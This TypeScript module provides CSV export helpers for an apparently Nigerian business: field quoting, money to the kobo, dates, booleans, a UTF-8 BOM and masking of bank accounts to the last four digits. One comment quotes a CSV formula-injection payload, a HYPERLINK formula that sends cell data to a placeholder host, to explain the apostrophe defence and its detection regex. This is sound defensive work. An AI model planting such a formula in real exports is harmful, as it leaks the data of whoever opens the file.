/**
 * CSV writing primitives for the admin data exports.
 *
 * WHY a hand-rolled writer rather than a library: the whole point of an
 * export is that the numbers in it can be reconciled against a bank
 * statement, so the two things that must never go wrong are quoting and
 * rounding. Both are twelve lines of code and both are tested by the
 * shape of Nigerian data rather than by a generic test suite:
 *
 *  - A Lagos address contains commas as a matter of course ("12b Adeola
 *    Odeku Street, Victoria Island, Lagos"), and a driver or ticket
 *    subject can contain a quote or a newline. An unquoted field there
 *    shifts every later column on the row by one, silently.
 *  - Money is written to the kobo, always. A CSV that rounds to whole
 *    naira cannot be reconciled, which defeats the reason the file
 *    exists.
 */

/**
 * RFC 4180 field escaping.
 *
 * Quote whenever the value contains a comma, a double quote, a carriage
 * return or a newline, and escape an embedded quote by doubling it.
 *
 * A leading space is also enough to make a spreadsheet mangle a value,
 * so leading and trailing whitespace forces quoting too.
 */
export function csvField(value: unknown): string {
  if (value === null || value === undefined) return '';
  const raw = value instanceof Date ? value.toISOString() : String(value);
  if (raw === '') return '';

  /*
   * Formula injection, found 2026-09-01.
   *
   * The quoting below makes the file PARSE correctly. It does nothing about
   * Excel and Sheets treating any cell that opens with = + - @ tab or CR as
   * a formula to execute. Nearly every column in these exports is free text
   * somebody outside the company typed: a company name, a customer name, an
   * address, a support subject. A business that names itself
   * =HYPERLINK("http://x/?d="&A1,"Invoice") gets that formula run by
   * whichever member of ops opens the export, in their session, on their
   * machine.
   *
   * A leading apostrophe is the standard neutraliser: both Excel and Sheets
   * read the remainder as literal text and do not show the quote.
   *
   * Numbers are exempt on purpose. Every money column can legitimately be
   * negative, and prefixing -1500.00 would turn an amount into text and
   * break the operator's totals. The rule is that the maths has to
   * reconcile, so a plain number is left exactly as it is.
   */
  const s = FORMULA_LEAD.test(raw) && !PLAIN_NUMBER.test(raw) ? `'${raw}` : raw;

  if (/[",\r\n]/.test(s) || s !== s.trim()) {
    return '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

/** Characters a spreadsheet reads as "this cell is a formula". */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** Left alone: a real number, including a negative amount. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

/** One CSV record, CRLF-terminated as RFC 4180 specifies. */
export function csvRow(values: unknown[]): string {
  return values.map(csvField).join(',') + '\r\n';
}

/**
 * Byte order mark.
 *
 * Excel on Windows reads a UTF-8 CSV as the system codepage unless the
 * file opens with a BOM, which turns Nigerian names carrying diacritics
 * into mojibake. The operator this feature exists for opens these in
 * Excel, so the file leads with one.
 */
export const UTF8_BOM = '\uFEFF';

/**
 * Money, to the kobo, always two decimals.
 *
 * Postgres returns numeric/decimal columns as strings and bigint as a
 * string too, so every amount arrives here as a string and Number() is
 * the conversion, not a re-rounding. Never emit whole naira: the founder
 * rule is that the maths has to reconcile, and it cannot if the file
 * rounds.
 */
export function money(value: unknown): string {
  if (value === null || value === undefined || value === '') return '';
  const n = Number(value);
  return Number.isFinite(n) ? n.toFixed(2) : '';
}

/** Money held in kobo (the payments table stores amountKobo as bigint). */
export function moneyFromKobo(value: unknown): string {
  if (value === null || value === undefined || value === '') return '';
  const n = Number(value);
  return Number.isFinite(n) ? (n / 100).toFixed(2) : '';
}

/** A plain decimal that is not money: distance, weight, rating. */
export function decimal(value: unknown, places = 2): string {
  if (value === null || value === undefined || value === '') return '';
  const n = Number(value);
  return Number.isFinite(n) ? n.toFixed(places) : '';
}

/** An integer count. Empty rather than "0" when the value is absent. */
export function count(value: unknown): string {
  if (value === null || value === undefined || value === '') return '';
  const n = Number(value);
  return Number.isFinite(n) ? String(Math.trunc(n)) : '';
}

/** ISO 8601 UTC, so a timestamp in the file is never ambiguous. */
export function isoDate(value: unknown): string {
  if (!value) return '';
  const d = value instanceof Date ? value : new Date(String(value));
  return Number.isNaN(d.getTime()) ? '' : d.toISOString();
}

/** true / false / empty, rather than Postgres' t and f. */
export function bool(value: unknown): string {
  if (value === null || value === undefined || value === '') return '';
  return value === true || value === 't' || value === 'true' ? 'true' : 'false';
}

/**
 * Bank account numbers are masked to the last 4, never written whole.
 *
 * House rule, and it has bitten this codebase already: an eager relation
 * shipped a driver's entire User row (bank account number included) into
 * a customer's chat. A payout export needs enough of the destination
 * account to match a line on a bank statement and nothing more, so the
 * full NUBAN is read out of the database and discarded here rather than
 * ever reaching a cell.
 */
export function accountLast4(value: unknown): string {
  if (value === null || value === undefined) return '';
  const digits = String(value).replace(/\D/g, '');
  return digits.length >= 4 ? digits.slice(-4) : '';
}
